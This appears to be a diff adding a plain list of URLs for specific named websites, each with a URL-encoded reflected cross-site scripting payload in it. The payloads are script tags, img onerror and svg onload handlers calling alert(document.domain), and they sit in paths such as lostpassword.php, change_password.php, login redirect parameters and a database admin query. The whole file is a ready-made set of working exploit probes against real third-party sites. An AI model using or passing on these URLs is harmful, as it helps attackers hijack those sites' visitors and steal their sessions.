@@ -1,0 +1,17 @@
+http://alaska-rundreisen.de/status%3E%3Cscript%3Ealert(31337)%3C%2Fscript%3E
+http://aldeianatura.de/lostpassword.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://alem-travel.de/Devices-Config.php?sta=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E
+http://alexander-noe.de/status%3E%3Cscript%3Ealert(31337)%3C%2Fscript%3E
+http://alkamaxx.de/query/%3Cimg%20src=x%20onerror=alert(document.domain)%3E/all
+http://altenheime-kreis-kleve.de/lostpassword.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://altenheime-recklinghausen.de/lostpassword.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://altenheime-wesel-duisburg.de/php/change_password.php/%22%3E%3Csvg%2Fonload%3Dalert(1)%3E
+http://altersgerechtigkeitsindex.de/index.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E?page=HOME
+http://amazon-warriors.de/query/%3Cimg%20src=x%20onerror=alert(document.domain)%3E/all
+http://amr.ascrionweb.de/?rsd=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://amshausen.de/gitlab/build_now%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://anaqua.de/index.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E?page=HOME
+http://ryxxc6lb.chemkoo.com/?db=mysql&server=db&table=event%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&username=root
+http://rz5tx.dierqi.com/maxsite/page/1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://rzaex.baehui.com/does_not_exist%22%22%3E%3Cscript%3Ealert%28%22XSS%22%29%3C/script%3E%3Cimg%20src=x
+https://ryunique9.com/login.html?returnTo=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
